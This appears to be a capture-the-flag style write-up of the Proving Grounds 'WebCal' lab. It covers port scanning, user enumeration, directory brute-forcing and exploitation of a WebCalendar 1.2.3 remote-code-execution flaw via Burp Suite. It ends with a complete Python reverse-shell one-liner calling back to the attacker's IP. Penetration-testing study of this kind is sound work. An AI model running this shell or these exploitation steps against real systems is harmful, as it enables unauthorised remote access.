##### Nmap 

```
nmap -Pn -p- -sC -sV 192.168.191.37 -T4 -oN WebCal.nmap
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-24%20213757.png)

##### FTP

```
ftp -p 192.168.191.37 21 
```

Not allow anonymous login.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-24%20233404.png)

##### HTTP

Try to find exploits in the HTTP service first.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-25%20010855.png)

Click the NOTIFY ME button at the bottom right of the webpage. It leads to the send.php page.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-25%20012840.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-25%20013044.png)

Scan directories.

```
feroxbuster -u http://192.168.191.37 -w /usr/share/wordlists/directory-list-2.3-medium.txt
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-25%20010345.png)

Analyze send.php in Burp Suite but I don’t know what it means, so I continue to look for other possibilities.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.25_14h42m26s_002_.png)

##### SMTP

Enumerate user names, nothing special.

```
smtp-user-enum -M RCPT -U /usr/share/wordlists/names.txt -t 192.168.191.37 -m 10 -f user@example.com
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal%202021-06-25%20092925.png)

Go back and scan directories with different dir list. Find the webcalendar.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.25_21h00m22s_006_.png)

Guess the login admin///admin (find in doc) but failed. (hydra with rockyou.txt failed :dizzy_face: )

```
http://<IP>/webcalendar/docs/WebCalendar-SysAdmin.html
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.25_22h38m37s_009_.png)

Look for available vulnerabilities and find a [WebCalendar RCE](https://www.exploit-db.com/exploits/18775), because the server is running version 1.2.3, so it might work.

After read the description. I plan to use Burp Suite to send the exploit request. Note that the code is written for use in php. The escape character backslash in the string must be removed. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h36m16s_008_.png)

I use the Repeater function to make it easier to test. First send exploit payload.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h02m07s_002_.png)

Second, use a simple command to test whether the exploit is successful. Convert "ls" command string into base64 format "bHM=". 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h37m37s_009_.png)

If you get response code 408 try to set the body encoding.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h18m42s_005_.png)

Now we can confirm that the exploit works and then try to send the reverse shell command. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h15m13s_004_.png)

I use the python command below to successfully get the connection. Convert the code to base64 format before sending.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.191",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/WebCal/WebCal_2021.06.26_14h06m39s_003_.png)
